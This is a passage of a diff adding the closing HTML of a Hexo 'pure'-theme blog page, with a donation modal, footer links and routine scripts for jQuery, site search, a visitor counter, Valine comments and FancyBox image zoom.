+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ink-scholar" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+</body>
+</html>
